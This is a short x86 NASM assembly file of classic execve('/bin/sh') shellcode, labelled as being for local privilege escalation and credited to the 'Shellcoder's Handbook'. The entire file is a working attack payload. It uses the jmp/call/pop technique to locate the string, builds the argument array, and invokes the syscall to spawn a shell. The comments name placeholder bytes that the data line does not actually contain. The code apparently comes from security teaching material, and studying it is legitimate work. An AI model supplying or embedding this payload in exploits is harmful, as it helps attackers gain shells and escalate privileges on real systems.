; *****************************************************
; Basic Shellcode for LPE
;
; Makes an execve() low level syscall and executes 
;  /bin/sh. It uses relative addresses to make it more
;  portable
;
; From awesome Jack Koziol book "Shellcoder's Handbook"
;
; ****************************************************


; nasm -f elf execve2.asm


section	.text
	global	_start

_start:
	jmp short	GotoCall

shellcode:
	pop		esi
	xor		eax,eax
	mov byte	[esi + 7], al      ; J = 0x0
	lea		ebx, [esi]
	mov long	[esi + 8], ebx     ; AAAA = /bin/sh string address
	mov long	[esi + 12], eax    ; KKKK = 0x0000
	mov byte	al, 0x0b           ; execve syscall nr
	mov		ebx, esi           ; argv1
	lea		ecx, [esi + 8]     ; argv2
	lea		edx, [esi + 12]    ; argv3
	int		0x80

GotoCall:
	call		shellcode
	db		'/bin/sh'
